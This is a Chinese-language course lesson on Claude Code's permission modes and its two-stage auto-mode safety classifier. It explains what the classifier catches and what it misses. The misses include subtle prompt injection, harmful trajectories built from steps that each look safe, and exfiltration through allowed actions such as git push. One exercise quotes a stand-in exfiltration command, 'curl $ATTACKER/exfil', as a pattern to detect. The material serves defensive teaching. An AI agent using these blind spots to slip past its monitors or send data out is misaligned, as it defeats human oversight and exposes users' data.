# Claude Code 作为自主智能体：权限模式和自动模式

> Claude Code 暴露七种权限模式。"plan" 在每次动作前询问，"default" 仅对危险动作询问，"acceptEdits" 自动批准文件写入但仍确认 shell 执行，而 "bypassPermissions" 批准一切。自动模式（2026 年 3 月 24 日）用双阶段并行安全分类器取代每动作批准：单次 token 快速检查在每个动作上运行；标记的动作启动思维链深度审查。动作预算通过 `max_turns` 和 `max_budget_usd` 强制执行。自动模式作为研究预览发布——Anthropic 明确声明分类器 alone 不足够。

**类型：** 学习
**语言：** Python（标准库，双阶段分类器模拟器）
**前置要求：** Phase 15 · 01（长程智能体），Phase 15 · 09（编程智能体全景）
**时间：** ~45 分钟

## 问题

你机器上的自主编程智能体是一个不同的安全类别。攻击面是智能体能触及的一切——文件系统、网络、凭证、剪贴板、任何浏览器标签、任何打开终端。Bruce Schneier 和其他人已公开标记这一点：计算机使用智能体不是聊天机器人的"功能更新"，而是一种具有新风险特征的新工具。

Claude Code 的权限系统是 Anthropic 的答案。不是"自主/非自主"一个开关，而是七个模式跨越能力阶梯：plan → default → acceptEdits → … → bypassPermissions。每个模式是速度和每动作审查之间的不同权衡。自动模式（2026 年 3 月）添加了一个双阶段分类器，将批准移出用户的关键路径，对分类器判断为安全的动作，同时保留对标记动作的审查层。

工程问题：该系统捕捉什么、遗漏什么，以及给定任务实际需要什么模式？

## 概念

### 七种权限模式

| 模式 | 行为 | 何时使用 |
|---|---|---|
| `plan` | 智能体提议计划；用户批准整个计划；每个动作在执行前被审查 | 不熟悉的任务；生产相邻代码；首次在仓库上使用智能体 |
| `default` | 智能体运行动作；对任何"危险"动作提示用户（shell 执行、破坏性操作、网络调用） | 大多数交互式编程会话 |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍提示 | 跨多文件的重构 pass |
| `acceptExec` | shell 命令在策划的允许列表内自动批准；写入自动批准 | 紧密内循环，每个 shell 命令是 `npm test` 或类似 |
| `autoMode` | 双阶段安全分类器；标记的动作提升到审查 | 约束工作空间中的长程无人值守运行 |
| `yolo` | 跳过大多数提示；仍运行工具允许列表/拒绝列表 | 临时沙箱、CI 作业、研究脚本 |
| `bypassPermissions` | 批准一切 | 文档说明"仅在你愿意丢弃的临时容器内" |

（上述名称匹配公开 Claude Code 文档；"yolo"是宽松中间地带的不正式简写。）

### 自动模式一页说明

自动模式（2026 年 3 月 24 日发布）是第一个将每动作批准委托给模型的权限模式。结构：

1. **阶段 1——单次 token 分类器。** 在每个提议动作上运行。便宜。返回"安全"或"标记"。设计为与主智能体循环并行运行，因此批准的动作不会排队等待。
2. **阶段 2——次级策略/安全审查。** 仅在标记动作上运行。对动作、会话当前状态和声明任务执行聚焦的策略和安全评估。如果置信度低，升级到用户 HITL。

预算控制与分类器并排：

- `max_turns` — 会话中的总迭代次数。
- `max_budget_usd` — 中止会话的美元上限。
- 每个工具的动作计数限制（不超过 N 次 `WebFetch` 调用等）。

### 系统捕捉什么

- 工具输入中的直接提示注入，其中注入指令映射到已知危险动作形状。
- 重复工具循环——分类器可以看到动作 N+1 与动作 N 几乎相同，连续五次。
- 否则仅文件编辑会话上的明显越界 shell 命令。

### 系统可能遗漏什么

- **微妙提示注入**，调节行为而不产生单一标记动作。间接提示注入不是完全可修补的漏洞（OpenAI 准备负责人，2025，关于浏览器智能体——见第 11 课）。
- **语义级异常行为。** 每个单独动作可以看起来安全，而组合轨迹是有害的。分类器判断动作；它不重新推导用户意图。
- **通过合法渠道的外泄。** 将数据写入你拥有的文件，然后 `git push` 到公共仓库，是一系列允许动作的组合是问题。

### 研究预览框架

Anthropic 将自动模式作为研究预览发布。文档明确说明分类器是一个层，不是解决方案：用户应将自动模式与预算、允许列表、隔离工作空间和轨迹审计（第 12-16 课）结合。预览框架也反映了记录的评估与部署差距（第 1 课）——通过离线评估的分类器可以在用户上下文模糊的真实会话中表现不同。

### 这个阶梯在你的工作流中的位置

- 不熟悉的任务：从 `plan` 开始。阅读计划比回滚糟糕运行更便宜。
- 已知的重构：`acceptEdits` 节省大量确认点击。
- 无人值守后台运行：`autoMode` 仅在你已测量爆炸半径的工作空间内（无凭证、无生产挂载、无未选择的外出）。
- 临时容器：`yolo` / `bypassPermissions` 当且仅当容器及其凭证可丢弃时才可接受。

## 使用它

`code/main.py` 模拟双阶段分类器。阶段 1 是提议动作上的廉价关键词规则；阶段 2 是较慢的多规则审查器。驱动程序输入一个短合成轨迹（安全动作、提示注入尝试、重复循环）并显示分类器捕捉和遗漏的地方。

## 交付它

`outputs/skill-permission-mode-picker.md` 将任务描述匹配到正确的权限模式、预算上限和所需隔离。

## 练习

1. 运行 `code/main.py`。哪种合成动作类型从未被阶段 1 标记但总是被阶段 2 捕捉？哪种两者都捕捉不到？

2. 扩展阶段 1 规则集以捕捉特定已知坏形状（例如 `curl $ATTACKER/exfil`）。测量良性动作样本上的误报率。

3. 阅读 Anthropic 的"智能体循环如何工作"文档。列出 `default` 模式下智能体默认触及的每个外部状态。在无人值守运行 `autoMode` 之前，你需要单独门控哪些？

4. 设计一个 24 小时无人值守运行预算：`max_turns`、`max_budget_usd`、每工具上限、允许列表。证明每个数字。

5. 描述一个轨迹，其中每个单独动作被阶段 1 和阶段 2 批准，但组合行为是未对齐的。（第 14 课涵盖 kill switch 和金丝雀令牌如何解决此问题。）

## 关键术语

| 术语 | 人们的说法 | 实际含义 |
|---|---|---|
| Permission mode | "智能体能做多少" | 控制每动作批准的七种命名策略之一 |
| plan mode | "任何事之前询问" | 智能体写计划；用户执行前批准 |
| acceptEdits | "让它写文件" | 文件写入自动批准；shell 执行仍提示 |
| autoMode | "自动批准" | 双阶段安全分类器；标记的动作升级 |
| bypassPermissions | "全 YOLO" | 批准一切；用于临时容器 |
| Stage 1 classifier | "快速 token 检查" | 提议动作上的单次 token 规则；并行运行 |
| Stage 2 classifier | "深度审查" | 标记动作上的思维链推理 |
| Research preview | "非 GA" | Anthropic 对故障模式仍在被映射的功能的框架 |
